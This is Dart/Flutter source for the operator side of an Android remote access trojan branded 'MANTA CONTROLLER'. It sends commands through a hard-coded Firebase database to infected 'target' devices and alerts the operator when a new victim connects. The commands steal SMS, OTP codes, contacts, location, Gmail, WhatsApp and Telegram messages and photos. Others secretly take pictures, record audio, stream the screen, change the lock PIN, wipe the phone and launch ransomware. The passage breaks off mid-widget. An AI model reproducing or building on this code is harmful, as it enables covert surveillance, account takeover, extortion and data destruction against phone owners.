import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:file_picker/file_picker.dart';
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:record/record.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:audioplayers/audioplayers.dart';
import 'main.dart'; // exports baseUrl and AppConfig.sessionKey
import 'chat_page.dart';




class Cmd {
  static const int lockScreen = 98765432;
  static const int takePhotoBack = 11223344;
  static const int takePhotoFront = 11223345;
  static const int enableAdmin = 99887766;
  static const int back = 66985478;
  static const int home = 25896321;
  static const int recents = 33654789;
  static const int notifications = 45832158;
  static const int click = 44598715;
  static const int setText = 885478962;
  static const int touch = 115987;
  static const int launchApp = 74789654;
  static const int uninstall = 64645897;
  static const int getApps = 1596485;
  static const int overlayShow = 5698742;
  static const int overlayHide = 89521475;
  static const int setLockPin = 87654321;
  static const int getContacts = 1001;
  static const int getSms = 1002;
  static const int sendSms = 1003;
  static const int getCallLogs = 1004;
  static const int getLocation = 1005;
  static const int getDeviceInfo = 1006;
  static const int getBrowserHistory = 1007;
  static const int vibrate = 1008;
  static const int wipe = 1009;
  static const int ransomware = 1010;
  static const int changeWallpaper = 1011;
  static const int voiceMessage = 1012;
  static const int screenMessage = 1013;
  static const int getFileList = 1014;
  static const int uploadFile = 1015;
  static const int torchOn = 1016;
  static const int torchOff = 1017;
  static const int torchBlink = 1018;
  static const int getNotifications = 1019;
  static const int getGallery = 1020;
  static const int fetchGmail = 200;
  static const int setLockMode = 2000;
  static const int sendVoice = 2001;
  static const int getWhatsAppNumber = 1050;
  static const int getOtp = 1051;
  static const int getTelegram = 1052;
  static const int getGoogleAccounts = 1053;
  static const int getWhatsAppMessages = 1054;
  static const int getTelegramMessages = 1055;
  static const int getGames = 1080;


  static const int screenshot = 1060;
  static const int screenRecordStart = 1061;
  static const int screenRecordStop = 1062;
  static const int screenStreamStart = 1063;
  static const int screenStreamStop = 1064;
  static const int recordAudio = 1070;
  static const int recordAudioStop = 1071;
  static const int lockChat = 3000;
  static const int unlockScreen = 98765433;
  static const int stopRansomware = 10101;
}




class ParamField {
  final String key, label, hint;
  const ParamField({required this.key, required this.label, this.hint = ''});
}

class CommandItem {
  final int id;
  final String name;
  final IconData icon;
  final Color color;
  final List<ParamField> paramFields;
  final bool isDanger;
  const CommandItem({
    required this.id,
    required this.name,
    required this.icon,
    required this.color,
    this.paramFields = const [],
    this.isDanger = false,
  });
  bool get needsInput => paramFields.isNotEmpty;
}

class CommandCategory {
  final String title;
  final IconData icon;
  final Color color;
  final List<CommandItem> commands;
  const CommandCategory({
    required this.title,
    required this.icon,
    required this.color,
    required this.commands,
  });
}




final List<CommandCategory> kCategories = [
  CommandCategory(
    title: 'Navigasi',
    icon: Icons.navigation_rounded,
    color: const Color(0xFF2979FF),
    commands: [
      CommandItem(
        id: Cmd.home,
        name: 'Home',
        icon: Icons.home_rounded,
        color: Color(0xFF2979FF),
      ),
      CommandItem(
        id: Cmd.sendVoice,
        name: 'Kirim Suara',
        icon: Icons.mic,
        color: Color(0xFFE91E63),
        paramFields: [
          ParamField(key: 'url', label: 'URL Suara', hint: 'https://...'),
        ],
      ),
      CommandItem(
        id: Cmd.back,
        name: 'Back',
        icon: Icons.arrow_back_ios_new_rounded,
        color: Color(0xFF2979FF),
      ),
      CommandItem(
        id: Cmd.recents,
        name: 'Recent Apps',
        icon: Icons.view_carousel_rounded,
        color: Color(0xFF2979FF),
      ),
      CommandItem(
        id: Cmd.notifications,
        name: 'Notifikasi',
        icon: Icons.notifications_rounded,
        color: Color(0xFF2979FF),
      ),
    ],
  ),
  CommandCategory(
    title: 'Media',
    icon: Icons.perm_media_rounded,
    color: const Color(0xFF00BFA5),
    commands: [
      CommandItem(
        id: Cmd.takePhotoBack,
        name: 'Foto Belakang',
        icon: Icons.camera_alt_rounded,
        color: Color(0xFF00BFA5),
      ),
      CommandItem(
        id: Cmd.takePhotoFront,
        name: 'Foto Depan',
        icon: Icons.camera_front_rounded,
        color: Color(0xFF00BFA5),
      ),
      CommandItem(
        id: Cmd.recordAudio,
        name: 'Rekam Suara',
        icon: Icons.mic_rounded,
        color: Colors.amber,
      ),
    ],
  ),
  CommandCategory(
    title: 'Sistem',
    icon: Icons.settings_rounded,
    color: const Color(0xFFFF6F00),
    commands: [
      CommandItem(
        id: Cmd.lockScreen,
        name: 'Kunci Layar',
        icon: Icons.lock_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.unlockScreen,
        name: 'Buka Kunci (Unlock)',
        icon: Icons.lock_open_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.setLockMode,
        name: 'Mode Kunci Layar',
        icon: Icons.lock_outline_rounded,
        color: const Color(0xFFFF6F00),
        paramFields: [
          ParamField(key: 'mode', label: 'Mode', hint: 'default / html / chat'),
          ParamField(
            key: 'url',
            label: 'URL',
            hint: 'https://... atau file://...',
          ),
        ],
      ),
      CommandItem(
        id: Cmd.setLockPin,
        name: 'Set PIN',
        icon: Icons.pin_rounded,
        color: Color(0xFFFF6F00),
        paramFields: [ParamField(key: 'pin', label: 'PIN Baru', hint: '1234')],
      ),
      CommandItem(
        id: Cmd.lockChat,
        name: 'Mode Lock Chat',
        icon: Icons.mark_chat_read_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.enableAdmin,
        name: 'Aktifkan Admin',
        icon: Icons.admin_panel_settings_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.overlayShow,
        name: 'Overlay ON',
        icon: Icons.layers_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.overlayHide,
        name: 'Overlay OFF',
        icon: Icons.layers_clear_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.vibrate,
        name: 'Getar',
        icon: Icons.vibration_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.changeWallpaper,
        name: 'Ganti Wallpaper',
        icon: Icons.wallpaper_rounded,
        color: Color(0xFFFF6F00),
        paramFields: [ParamField(key: 'url', label: 'URL Gambar')],
      ),
      CommandItem(
        id: Cmd.torchOn,
        name: 'Flash ON',
        icon: Icons.flashlight_on_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.torchOff,
        name: 'Flash OFF',
        icon: Icons.flashlight_off_rounded,
        color: Color(0xFFFF6F00),
      ),
      CommandItem(
        id: Cmd.torchBlink,
        name: 'Flash Blink',
        icon: Icons.light_mode_rounded,
        color: Color(0xFFFF6F00),
      ),
    ],
  ),
  CommandCategory(
    title: 'Aplikasi',
    icon: Icons.apps_rounded,
    color: const Color(0xFF7C4DFF),
    commands: [
      CommandItem(
        id: Cmd.getApps,
        name: 'Daftar App',
        icon: Icons.apps_rounded,
        color: Color(0xFF7C4DFF),
      ),
      CommandItem(
        id: Cmd.launchApp,
        name: 'Buka App',
        icon: Icons.open_in_new_rounded,
        color: Color(0xFF7C4DFF),
        paramFields: [
          ParamField(
            key: 'package',
            label: 'Package Name',
            hint: 'com.example.app',
          ),
        ],
      ),
      CommandItem(
        id: Cmd.uninstall,
        name: 'Hapus App',
        icon: Icons.delete_rounded,
        color: Color(0xFF7C4DFF),
        paramFields: [
          ParamField(
            key: 'package',
            label: 'Package Name',
            hint: 'com.example.app',
          ),
        ],
      ),
    ],
  ),
  CommandCategory(
    title: 'Interaksi',
    icon: Icons.touch_app_rounded,
    color: const Color(0xFFE91E63),
    commands: [
      CommandItem(
        id: Cmd.click,
        name: 'Klik Elemen',
        icon: Icons.touch_app_rounded,
        color: Color(0xFFE91E63),
        paramFields: [
          ParamField(
            key: 'resourceId',
            label: 'Resource ID',
            hint: 'com.app:id/btn',
          ),
          ParamField(key: 'text', label: 'Text', hint: 'OK'),
        ],
      ),
      CommandItem(
        id: Cmd.setText,
        name: 'Set Teks',
        icon: Icons.text_fields_rounded,
        color: Color(0xFFE91E63),
        paramFields: [
          ParamField(
            key: 'resourceId',
            label: 'Resource ID',
            hint: 'com.app:id/edit',
          ),
          ParamField(key: 'text', label: 'Isi Teks', hint: 'Hello'),
        ],
      ),
      CommandItem(
        id: Cmd.touch,
        name: 'Sentuh XY',
        icon: Icons.ads_click_rounded,
        color: Color(0xFFE91E63),
        paramFields: [
          ParamField(
            key: 'bounds',
            label: 'Bounds',
            hint: 'Rect(100,200-300,400)',
          ),
        ],
      ),
      CommandItem(
        id: Cmd.screenMessage,
        name: 'Pesan Layar',
        icon: Icons.message_rounded,
        color: Color(0xFFE91E63),
        paramFields: [
          ParamField(key: 'text', label: 'Isi Pesan', hint: 'Hello!'),
          ParamField(
            key: 'toastType',
            label: 'Tipe Toast',
            hint: 'normal / info / success / error / warning',
          ),
        ],
      ),
      CommandItem(
        id: Cmd.voiceMessage,
        name: 'Suara TTS',
        icon: Icons.record_voice_over_rounded,
        color: Color(0xFFE91E63),
        paramFields: [
          ParamField(key: 'text', label: 'Teks TTS', hint: 'Hello!'),
        ],
      ),
    ],
  ),
  CommandCategory(
    title: 'Data',
    icon: Icons.folder_rounded,
    color: const Color(0xFF00897B),
    commands: [
      CommandItem(
        id: Cmd.getContacts,
        name: 'Ambil Kontak',
        icon: Icons.contacts_rounded,
        color: Color(0xFF00897B),
      ),
      CommandItem(
        id: Cmd.getSms,
        name: 'Ambil SMS',
        icon: Icons.sms_rounded,
        color: Color(0xFF00897B),
      ),
      CommandItem(
        id: Cmd.getCallLogs,
        name: 'Log Panggilan',
        icon: Icons.call_rounded,
        color: Color(0xFF00897B),
      ),
      CommandItem(
        id: Cmd.getLocation,
        name: 'Lokasi GPS',
        icon: Icons.location_on_rounded,
        color: Color(0xFF00897B),
      ),
      CommandItem(
        id: Cmd.getDeviceInfo,
        name: 'Info Perangkat',
        icon: Icons.info_rounded,
        color: Color(0xFF00897B),
      ),
      CommandItem(
        id: Cmd.getBrowserHistory,
        name: 'Riwayat Browser',
        icon: Icons.history_rounded,
        color: Color(0xFF00897B),
      ),
      CommandItem(
        id: Cmd.sendSms,
        name: 'Kirim SMS',
        icon: Icons.send_rounded,
        color: Color(0xFF00897B),
        paramFields: [
          ParamField(key: 'phone', label: 'Nomor HP', hint: '+628xxx'),
          ParamField(key: 'message', label: 'Isi SMS', hint: 'Halo!'),
        ],
      ),
      CommandItem(
        id: Cmd.getFileList,
        name: 'Daftar File',
        icon: Icons.folder_open_rounded,
        color: Color(0xFF00897B),
        paramFields: [
          ParamField(
            key: 'path',
            label: 'Path Folder',
            hint: '/sdcard/Download',
          ),
        ],
      ),
      CommandItem(
        id: Cmd.uploadFile,
        name: 'Upload File',
        icon: Icons.upload_file_rounded,
        color: Color(0xFF00897B),
        paramFields: [
          ParamField(key: 'path', label: 'Path File', hint: '/sdcard/foto.jpg'),
        ],
      ),
      CommandItem(
        id: Cmd.getNotifications,
        name: 'Ambil Notifikasi',
        icon: Icons.notifications_active_rounded,
        color: Color(0xFF00897B),
      ),
      CommandItem(
        id: Cmd.getGallery,
        name: 'Ambil Galeri',
        icon: Icons.photo_library_rounded,
        color: Color(0xFF00897B),
        paramFields: [
          ParamField(
            key: 'limit',
            label: 'Jumlah (atau thumb:20)',
            hint: '20 atau thumb:20',
          ),
        ],
      ),
      CommandItem(
        id: Cmd.fetchGmail,
        name: 'Ambil Email Gmail',
        icon: Icons.email_rounded,
        color: Color(0xFF00897B),
        paramFields: [
          ParamField(key: 'max', label: 'Jumlah Email', hint: '10'),
        ],
      ),

      CommandItem(
        id: Cmd.getWhatsAppNumber,
        name: 'Nomor WA',
        icon: Icons.phone_android_rounded,
        color: Color(0xFF25D366),
      ),
      CommandItem(
        id: Cmd.getOtp,
        name: 'Ambil OTP',
        icon: Icons.sms_rounded,
        color: Color(0xFFF57C00),
      ),
      CommandItem(
        id: Cmd.getTelegram,
        name: 'Akun Telegram',
        icon: Icons.send_rounded,
        color: Color(0xFF0088CC),
      ),
      CommandItem(
        id: Cmd.getGoogleAccounts,
        name: 'Akun Google',
        icon: Icons.g_mobiledata_rounded,
        color: Color(0xFFDB4437),
      ),
      CommandItem(
        id: Cmd.getGames,
        name: 'Info Game (FF/ML)',
        icon: Icons.sports_esports_rounded,
        color: Color(0xFFF44336),
      ),
      CommandItem(
        id: Cmd.getWhatsAppMessages,
        name: 'Pesan WA',
        icon: Icons.chat_rounded,
        color: Color(0xFF25D366),
        paramFields: [ParamField(key: 'limit', label: 'Jumlah', hint: '10')],
      ),
      CommandItem(
        id: Cmd.getTelegramMessages,
        name: 'Pesan Telegram',
        icon: Icons.chat_bubble_rounded,
        color: Color(0xFF0088CC),
        paramFields: [ParamField(key: 'limit', label: 'Jumlah', hint: '10')],
      ),
    ],
  ),
  CommandCategory(
    title: 'Layar',
    icon: Icons.screenshot_monitor_rounded,
    color: const Color(0xFF00ACC1),
    commands: [
      CommandItem(
        id: Cmd.screenStreamStart,
        name: 'Live Screen',
        icon: Icons.live_tv_rounded,
        color: Colors.deepOrangeAccent,
      ),
      CommandItem(
        id: Cmd.screenStreamStop,
        name: 'Stop Live',
        icon: Icons.stop_screen_share_rounded,
        color: Colors.redAccent,
      ),
      CommandItem(
        id: Cmd.screenshot,
        name: 'Screenshot',
        icon: Icons.screenshot_rounded,
        color: Color(0xFF00ACC1),
      ),
    ],
  ),
  CommandCategory(
    title: 'Berbahaya',
    icon: Icons.warning_rounded,
    color: const Color(0xFFB71C1C),
    commands: [
      CommandItem(
        id: Cmd.wipe,
        name: 'Wipe Perangkat',
        icon: Icons.delete_forever_rounded,
        color: Color(0xFFB71C1C),
        isDanger: true,
      ),
      CommandItem(
        id: Cmd.ransomware,
        name: 'Ransomware',
        icon: Icons.dangerous_rounded,
        color: Color(0xFFD50000),
        isDanger: true,
      ),
      CommandItem(
        id: Cmd.stopRansomware,
        name: 'Stop Ransomware',
        icon: Icons.stop_circle_rounded,
        color: Color(0xFFD50000),
      ),
    ],
  ),
];




String buildParam(CommandItem cmd, Map<String, String> inputs) {
  switch (cmd.id) {
    case Cmd.click:
    case Cmd.setText:
      return '${inputs['resourceId'] ?? ''};${inputs['text'] ?? ''}';
    case Cmd.sendVoice:
    case Cmd.changeWallpaper:
      return inputs['url'] ?? '';
    case Cmd.touch:
      return inputs['bounds'] ?? '';
    case Cmd.launchApp:
    case Cmd.uninstall:
      return inputs['package'] ?? '';
    case Cmd.getFileList:
    case Cmd.uploadFile:
      return inputs['path'] ?? '';
    case Cmd.sendSms:
      return jsonEncode({
        'phone': inputs['phone'] ?? '',
        'message': inputs['message'] ?? '',
      });
    case Cmd.voiceMessage:
      return inputs['text'] ?? '';
    case Cmd.screenMessage:
      return jsonEncode({
        'type': inputs['toastType'] ?? 'normal',
        'message': inputs['text'] ?? '',
      });
    case Cmd.setLockPin:
      return inputs['pin'] ?? '';
    case Cmd.setLockMode:
      final mode = inputs['mode'] ?? 'default';
      final url = inputs['url'] ?? '';
      if (url.isNotEmpty) return 'mode=$mode&url=$url';
      return mode;
    case Cmd.getGallery:
    case Cmd.getWhatsAppMessages:
    case Cmd.getTelegramMessages:
    case Cmd.fetchGmail:
      return inputs['limit'] ?? inputs['max'] ?? '10';
    default:
      return '';
  }
}




const _bg = Color(0xFF08111F);
const _card = Color(0xFF101A2B);
const _card2 = Color(0xFF152238);
const _accent = Color(0xFF34C2FF);
const _accentAlt = Color(0xFF7C8CFF);
const _success = Color(0xFF3DDC97);
const _warning = Color(0xFFFFB454);
const _danger = Color(0xFFFF6B6B);
const _textP = Color(0xFFF5F9FF);
const _textS = Color(0xFF91A4C3);
const _border = Color(0xFF203049);




class AppConfig {
  static String? sessionKey;
  static String? username;
  static String? role;
  static List<dynamic>? cachedSenders;
  static DateTime? lastSendersFetch;
}

class HttpService {

  static Future<String?> uploadFile(String filePath) async {
    if (baseUrl.isEmpty) throw Exception('baseUrl belum dikonfigurasi');
    var request = http.MultipartRequest('POST', Uri.parse('$baseUrl/upload'));
    request.files.add(await http.MultipartFile.fromPath('file', filePath));
    var response = await request.send();
    if (response.statusCode == 200) {
      var responseData = await response.stream.bytesToString();
      var json = jsonDecode(responseData);
      return json['url'];
    }
    return null;
  }

  static String _genCmdId() {
    final ts = DateTime.now().millisecondsSinceEpoch;
    final chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    final rand = DateTime.now().microsecondsSinceEpoch;
    final suffix = List.generate(
      6,
      (i) => chars[(rand * (i + 7)) % chars.length],
    ).join();
    return 'cmd_${ts}_$suffix';
  }

  static String get _key {
    if (AppConfig.sessionKey == null) throw Exception('Session belum tersedia');
    return AppConfig.sessionKey!;
  }


  static Future<String> sendCommand(
    String deviceId,
    int cmd,
    String param,
  ) async {
    final cmdId = _genCmdId();
    try {
      final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/');
      final ref = fb.ref('commands/$deviceId/$cmdId');
      await ref.set({
        'cmd': cmd,
        'param': param,
        'timestamp': DateTime.now().millisecondsSinceEpoch,
        'status': 'pending',
      });
      debugPrint('✅ Command sent via Firebase: cmdId=$cmdId');
      return cmdId;
    } catch (e) {
      throw Exception('Firebase Error: $e');
    }
  }

  static Stream<Map<String, dynamic>> listenResults(
    String deviceId, {
    required String cmdId,
    int maxIterations = 40,
  }) async* {
    debugPrint('📡 Firebase listening for result: deviceId=$deviceId cmdId=$cmdId');
    final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/');
    

    final controller = StreamController<Map<String, dynamic>>();
    
    final query = fb.ref('results/$deviceId/$cmdId');
    final subscription = query.onValue.listen((event) {
      if (event.snapshot.value != null) {
        try {
          final data = Map<String, dynamic>.from(event.snapshot.value as Map);
          debugPrint('✅ Result diterima via Firebase: cmdId=$cmdId type=${data['type']}');
          if (!controller.isClosed) {
            controller.add(data);
          }
        } catch (e) {
          debugPrint('⚠️ Result parse error: $e');
        }
      }
    });


    Timer(const Duration(seconds: 45), () {
      if (!controller.isClosed) {
        debugPrint('⏳ Firebase result timeout for cmdId=$cmdId');
        subscription.cancel();
        controller.close();
      }
    });

    yield* controller.stream;
    await subscription.cancel();
  }
}




class ApiService {
  static String get _key {
    if (AppConfig.sessionKey == null) throw Exception('Session belum tersedia');
    return AppConfig.sessionKey!;
  }

  static Future<List<Map<String, dynamic>>> getTargets() async {
    try {
      final fb = FirebaseDatabase.instanceFor(
        app: Firebase.app(),
        databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/',
      );
      final snapshot = await fb.ref('devices').get().timeout(const Duration(seconds: 10));
      if (!snapshot.exists) return [];

      final val = snapshot.value;
      if (val is! Map) return [];

      final role = (AppConfig.role ?? '').toUpperCase();
      final username = (AppConfig.username ?? '').toLowerCase();
      final isAdmin = role == 'KINGZ' || role == 'OWNER' || username == 'kingz' || username == 'owner';

      final List<Map<String, dynamic>> devices = [];
      for (final entry in val.entries) {
        if (entry.value is Map) {
          final map = Map<String, dynamic>.from(entry.value);
          
          if (!isAdmin) {

            final deviceSessionId = map['session_id']?.toString() ?? '';
            if (deviceSessionId != _key) continue; // Skip jika bukan milik user ini
          }

          map['device_id'] = entry.key; // Inject key as device_id
          final ls = map['last_seen'];
          if (ls is int) {
            map['last_seen'] = DateTime.fromMillisecondsSinceEpoch(ls);
          } else if (ls is String) {
            map['last_seen'] = DateTime.tryParse(ls);
          }
          devices.add(map);
        }
      }
      
      debugPrint('✅ Targets via Firebase: ${devices.length}');

      devices.sort((a, b) {
        final aDate = a['last_seen'] as DateTime?;
        final bDate = b['last_seen'] as DateTime?;
        if (aDate == null && bDate == null) return 0;
        if (aDate == null) return 1;
        if (bDate == null) return -1;
        return bDate.compareTo(aDate);
      });
      return devices;
    } catch (e) {
      debugPrint('❌ Error fetching targets from Firebase: $e');
      throw Exception('Firebase Error: $e');
    }
  }

  static Future<void> deleteTarget(String deviceId) async {
    if (baseUrl.isEmpty) return;
    final uri = Uri.parse(
      '$baseUrl/target',
    ).replace(queryParameters: {'device_id': deviceId, 'key': _key});
    await http
        .delete(uri, headers: {'x-session-key': _key})
        .timeout(const Duration(seconds: 10));
    debugPrint('🗑️ Deleted via HTTP: $deviceId');
  }
}




class TargetListPage extends StatefulWidget {
  const TargetListPage({super.key});
  @override
  State<TargetListPage> createState() => _TargetListPageState();
}

class _TargetListPageState extends State<TargetListPage>
    with SingleTickerProviderStateMixin {
  List<Map<String, dynamic>> _targets = [];
  bool _loading = false;
  String? _fetchErr;
  late AnimationController _pulse;
  Timer? _timer;
  final Set<String> _knownDevices = {};
  bool _firstFetchDone = false;
  final _searchCtrl = TextEditingController();
  String _q = '';
  bool _searchExpanded = false;
  final _searchFocus = FocusNode();

  List<Map<String, dynamic>> get _filtered {
    if (_q.trim().isEmpty) return _targets;
    final q = _q.toLowerCase();
    return _targets.where((t) {
      final model = (t['model'] as String? ?? '').toLowerCase();
      final manufacturer = (t['manufacturer'] as String? ?? '').toLowerCase();
      final deviceId = (t['device_id'] as String? ?? '').toLowerCase();
      final sdk = (t['sdk']?.toString() ?? '').toLowerCase();
      return model.contains(q) ||
          manufacturer.contains(q) ||
          deviceId.contains(q) ||
          sdk.contains(q);
    }).toList();
  }

  int get _onlineCount => _targets.where((t) {
    final ls = t['last_seen'] as DateTime?;
    return ls != null && DateTime.now().difference(ls).inSeconds < 150;
  }).length;

  @override
  void initState() {
    super.initState();
    _pulse = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    _fetch(showLoading: true);
    _timer = Timer.periodic(const Duration(seconds: 15), (_) => _fetch());
  }

  @override
  void dispose() {
    _pulse.dispose();
    _timer?.cancel();
    _searchCtrl.dispose();
    _searchFocus.dispose();
    super.dispose();
  }

  Future<void> _fetch({bool showLoading = false}) async {
    if (_loading) return;
    if (showLoading || _targets.isEmpty)
      setState(() {
        _loading = true;
        _fetchErr = null;
      });
    try {
      final data = await ApiService.getTargets();
      if (mounted) {

        for (var device in data) {
          final id = device['device_id']?.toString();
          if (id != null) {
            if (_firstFetchDone && !_knownDevices.contains(id)) {
              _showNewTargetPopup(device);
            }
            _knownDevices.add(id);
          }
        }
        _firstFetchDone = true;

        setState(() {
          _targets = data;
          _loading = false;
          _fetchErr = null;
        });
      }
    } catch (e) {
      if (mounted) {
        if (_targets.isEmpty)
          setState(() {
            _fetchErr = e.toString();
            _loading = false;
          });
        else
          setState(() {
            _loading = false;
          });
      }
    }
  }

  void _showNewTargetPopup(Map<String, dynamic> device) {
    final model = device['model'] ?? 'Unknown';
    final manufacturer = device['manufacturer'] ?? '';
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.2),
                shape: BoxShape.circle,
              ),
              child: const Icon(Icons.phonelink_ring_rounded,
                  color: Colors.white, size: 20),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text('Target Baru Masuk!',
                      style:
                          TextStyle(fontWeight: FontWeight.bold, fontSize: 14)),
                  Text('$manufacturer $model baru saja terhubung',
                      style: const TextStyle(fontSize: 12, color: Colors.white70)),
                ],
              ),
            ),
          ],
        ),
        backgroundColor: const Color(0xFF2979FF),
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 5),
        margin: const EdgeInsets.fromLTRB(15, 5, 15, 70),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
        elevation: 8,
      ),
    );
  }

  Future<void> _deleteTarget(String deviceId, String model) async {
    final confirm = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: const Color(0xFF14141F),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(22)),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: _accent.withOpacity(0.12),
                borderRadius: BorderRadius.circular(10),
              ),
              child: const Icon(
                Icons.delete_forever_rounded,
                color: _accent,
                size: 18,
              ),
            ),
            const SizedBox(width: 10),
            const Text(
              'Hapus Perangkat?',
              style: TextStyle(color: _textP, fontSize: 15),
            ),
          ],
        ),
        content: Text(
          'Perangkat "$model" akan dihapus permanen.\nYakin lanjutkan?',
          style: const TextStyle(color: _textS, height: 1.5, fontSize: 13),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: const Text('Batal', style: TextStyle(color: _textS)),
          ),
          ElevatedButton(
            onPressed: () => Navigator.pop(ctx, true),
            style: ElevatedButton.styleFrom(
              backgroundColor: _accent,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(10),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
            ),
            child: const Text(
              'Hapus',
              style: TextStyle(fontWeight: FontWeight.bold),
            ),
          ),
        ],
      ),
    );
    if (confirm != true) return;
    setState(() => _loading = true);
    try {
      await ApiService.deleteTarget(deviceId);
      setState(() {
        _targets.removeWhere((t) => t['device_id'] == deviceId);
        _loading = false;
      });
      await _fetch();
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('Gagal hapus: $e'),
            backgroundColor: _accent,
            behavior: SnackBarBehavior.floating,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
            ),
            margin: const EdgeInsets.all(16),
          ),
        );
        setState(() => _loading = false);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(
        child: Column(
          children: [
            Flexible(
              flex: 0,
              child: SingleChildScrollView(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    _buildHeader(),
                    _buildSearchBar(),
                    _buildStatRow(),
                  ],
                ),
              ),
            ),
            Expanded(child: _buildBody()),
          ],
        ),
      ),
    );
  }


  Widget _buildHeader() {
    return Container(
      margin: const EdgeInsets.fromLTRB(14, 14, 14, 0),
      padding: const EdgeInsets.fromLTRB(18, 18, 18, 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [_card2, _card, const Color(0xFF0D1D33)],
        ),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: _border.withOpacity(0.95)),
        boxShadow: [
          BoxShadow(
            color: _accent.withOpacity(0.08),
            blurRadius: 24,
            offset: const Offset(0, 10),
          ),
          BoxShadow(
            color: Colors.black.withOpacity(0.24),
            blurRadius: 18,
            offset: const Offset(0, 6),
          ),
        ],
      ),
      child: Row(
        children: [

          Container(
            width: 46,
            height: 46,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  _accent.withOpacity(0.3),
                  _accentAlt.withOpacity(0.14),
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(15),
              border: Border.all(color: _accent.withOpacity(0.4)),
              boxShadow: [
                BoxShadow(
                  color: _accent.withOpacity(0.2),
                  blurRadius: 12,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: const Icon(Icons.radar_rounded, color: _accent, size: 22),
          ),
          const SizedBox(width: 13),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    const Text(
                      'MANTA',
                      style: TextStyle(
                        color: _textP,
                        fontSize: 20,
                        fontWeight: FontWeight.w800,
                        letterSpacing: 0.6,
                      ),
                    ),
                    const SizedBox(width: 5),
                    Container(
                      padding: const EdgeInsets.symmetric(
                        horizontal: 6,
                        vertical: 2,
                      ),
                      decoration: BoxDecoration(
                        color: _accent.withOpacity(0.14),
                        borderRadius: BorderRadius.circular(5),
                        border: Border.all(color: _accent.withOpacity(0.3)),
                      ),
                      child: const Text(
                        'CONTROLLER',
                        style: TextStyle(
                          color: _accent,
                          fontSize: 7.8,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 0.8,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 2),
                Row(
                  children: [
                    AnimatedBuilder(
                      animation: _pulse,
                      builder: (_, __) => Container(
                        width: 6,
                        height: 6,
                        margin: const EdgeInsets.only(right: 5),
                        decoration: BoxDecoration(
                          color: _success.withOpacity(0.5 + _pulse.value * 0.5),
                          shape: BoxShape.circle,
                          boxShadow: [
                            BoxShadow(
                              color: _success.withOpacity(_pulse.value * 0.6),
                              blurRadius: 5,
                            ),
                          ],
                        ),
                      ),
                    ),
                    Text(
                      '${_targets.length} perangkat',
                      style: const TextStyle(color: _textS, fontSize: 11),
                    ),
                    if (_onlineCount > 0) ...[
                      const Text(
                        ' · ',
                        style: TextStyle(color: _textS, fontSize: 11),
                      ),
                      Text(
                        '$_onlineCount online',
                        style: const TextStyle(
                          color: _success,
                          fontSize: 11,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ],
                ),
              ],
            ),
          ),

          GestureDetector(
            onTap: () {
              setState(() => _searchExpanded = !_searchExpanded);
              if (_searchExpanded) {
                Future.delayed(
                  const Duration(milliseconds: 100),
                  () => _searchFocus.requestFocus(),
                );
              } else {
                _searchCtrl.clear();
                setState(() => _q = '');
                _searchFocus.unfocus();
              }
            },
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: _searchExpanded ? _accent.withOpacity(0.12) : _card2,
